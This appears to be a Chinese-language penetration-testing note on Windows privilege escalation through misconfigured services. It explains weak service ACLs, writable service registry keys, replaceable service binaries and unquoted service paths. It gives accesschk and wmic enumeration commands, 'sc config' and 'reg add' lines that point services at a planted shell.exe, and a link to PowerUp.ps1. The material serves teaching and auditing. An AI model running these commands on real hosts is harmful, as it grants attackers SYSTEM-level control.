# 利用系统服务提权

#### 提权原理

路径：`\HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\`中 imagePath键指向该系统所启动的二进制程序，Window服务会操作系统启动时运行。

#### 工具accesschk

https://learn.microsoft.com/zh-cn/sysinternals/downloads/accesschk

用于枚举目标主机上存在的权限缺陷的系统服务

#### 利用不安全的服务权限脆弱

**原理：**ACL配置服务疏忽，使低权限用户对高权限下运行的系统服务拥有更改服务配置的权限，即(SERVICE\_QUERY\_CONFIG、SERVICE\_ALL\_ACESS)

低权限用户检查`"Authenticated Users"`和`"INTERACTIVE"`组对系统服务的权限，前者为经过身份严重的用户，后者为交互式用户组

```
accesschk.exe -uwcqv "Authenticated Users" *
```

假设 AuthenticatedUsers组对InsproSvc具有查询服务配置权限，则可以执行

```
sc config insproSvc binpath= "cmd.exe /k C:\Users\Public\shell.exe"
```

#### 利用服务注册表权限

**原理：**注册表ACL配置错误，导致低权限用户对服务的注册表拥有写入权限

低权限用户检查"Authenticated Users"具有写入权限的服务注册表

```
accesschk.exe /accepteula -uvwqk "Authenticated Users" HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services
```

假设Authenticated Users组对RegSvc服务的注册表拥有完全控制权限

```
reg add HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\RegSvc /v ImagePath /t REG_EXPAND_SZ /d "cmd.exe" /k C:\Users\Public\shell.exe
```

#### 利用服务路径权限可控

**原理：**主机用户存在错误配置或操作，导致低权限用户可以替换服务调用的二进制文件

低权限用户检查InsexeSvc服务是否具有写入权限

```
accesschk.exe /accepteula -quv "Authenticated Users" "C:\Program Files\Insecure Executables\"
```

#### 利用未引入的服务路径提权(Unquoted Service Path)

**原理：**如果完整路径中包含空格且未有效包含在引号中，则对该路径的每个空格，Windows会按照从左到右的顺序尝试寻找并执行与空格前的名字相匹配的程序。

枚举主机上有漏洞的服务

```
wmic service get DisplayName,PathName,StartMode|findstr /i /v "C:\Windows\\" | findstr/i /v """
```

#### 一键利用脚本：

https://github.com/PowerShellMafia/PowerSploit/blame/master/Privesc/PowerUp.ps1
